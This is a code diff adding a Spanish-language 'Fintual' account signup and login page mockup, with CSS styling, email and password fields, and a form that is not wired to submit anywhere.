@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <script src="https://www.anomala.cc/script.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="preconnect" href="https://rsms.me/" />
+    <link rel="stylesheet" href="https://rsms.me/inter/inter.css" />
+    <title>Fintual</title>
+    <style>
+      :root {
+        font-family: Inter, sans-serif;
+        font-feature-settings: "liga" 1, "calt" 1; /* fix for Chrome */
+      }
+      @supports (font-variation-settings: normal) {
+        :root {
+          font-family: InterVariable, sans-serif;
+        }
+      }
+
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        min-height: 100vh;
+        background-color: #fff;
+        padding: 20px;
+      }
+
+      .logo {
+        width: 150px;
+        margin: 40px 0;
+      }
+
+      .container {
+        width: 100%;
+        max-width: 440px;
+        padding: 20px;
+        border-radius: 16px;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
+        background-color: white;
+      }
+
+      .tabs {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 40px;
+      }
+
+      .tab {
+        flex: 1;
+        padding: 12px;
+        text-align: center;
+        background-color: #f8f9fe;
+        border-radius: 100px;
+        cursor: pointer;
+        font-size: 16px;
+        color: #666;
+      }
+
+      .tab.active {
+        background-color: white;
+        color: black;
+        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+      }
+
+      h1 {
+        text-align: center;
+        font-size: 24px;
+        margin-bottom: 10px;
+      }
+
+      .subtitle {
+        text-align: center;
+        color: #666;
+        margin-bottom: 30px;
+      }
+
+      input {
+        width: 100%;
+        padding: 16px;
+        margin-bottom: 15px;
+        border: none;
+        border-radius: 8px;
+        background-color: #f8f9fe;
+        font-size: 16px;
+      }
+
+      .password-input {
+        position: relative;
+      }
+
+      .eye-icon {
+        position: absolute;
+        right: 16px;
+        top: 50%;
+        transform: translateY(-50%);
+        color: #666;
+        cursor: pointer;
+      }
+
+      .checkbox-container {
+        display: flex;
+        align-items: flex-start;
+        gap: 10px;
+        margin-bottom: 20px;
+      }
+
+      .checkbox-container input {
+        width: 20px;
+        height: 20px;
+        margin: 0;
+      }
+
+      .terms {
+        font-size: 14px;
+        color: #666;
+      }
+
+      .terms a {
+        color: #0066ff;
+        text-decoration: none;
+      }
+
+      button {
+        width: 100%;
+        padding: 16px;
+        border: none;
+        border-radius: 8px;
+        background-color: #e9ecef;
+        color: #666;
+        font-size: 16px;
+        cursor: pointer;
+        margin-bottom: 15px;
+      }
+
+      .login-link {
+        display: block;
+        text-align: center;
+        color: #0066ff;
+        text-decoration: none;
+        padding: 16px;
+        background-color: #f8f9fe;
+        border-radius: 8px;
+        margin-bottom: 15px;
+      }
+
+      .divider {
+        text-align: center;
+        color: #666;
+        margin-bottom: 15px;
+      }
+
+      .google-button {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+        width: 100%;
+        padding: 16px;
+        border: none;
+        border-radius: 8px;
+        background-color: white;
+        color: #666;
+        font-size: 16px;
+        cursor: pointer;
+        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+      }
+
+      .google-icon {
+        width: 18px;
+        height: 18px;
+      }
+    </style>
+  </head>
+  <body>
+    <img
+      src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTEyIDJMNCAxMmw4IDEwIDgtMTB6IiBmaWxsPSIjMDA2NmZmIi8+PC9zdmc+"
+      alt="Logo"
+      class="logo"
+    />
+
+    <div class="container">
+      <div class="tabs">
+        <div class="tab active">👤 Login</div>
+        <div class="tab">🐣 Crear cuenta</div>
+      </div>
+
+      <h1>Abre tu cuenta en 5 minutos 🤝</h1>
+      <p class="subtitle">Escribe tu nombre y clave!</p>
+
+      <form>
+        <input placeholder="Email" />
+
+        <div class="password-input">
+          <input type="password" placeholder="Clave" />
+          <span class="eye-icon"></span>
+        </div>
+
+        <div class="checkbox-container">
+          <input type="checkbox" id="terms" />
+          <label for="terms" class="terms">
+            Acepto los <a href="#">Términos de uso</a> y la
+            <a href="#">Política de privacidad</a>
+          </label>
+        </div>
+
+        <button type="submit" style="background-color: #0066ff; color: white">
+          Crear cuenta
+        </button>
+        <a href="#" class="login-link">Ya tengo mi cuenta</a>
+      </form>
+    </div>
+  </body>
+</html>
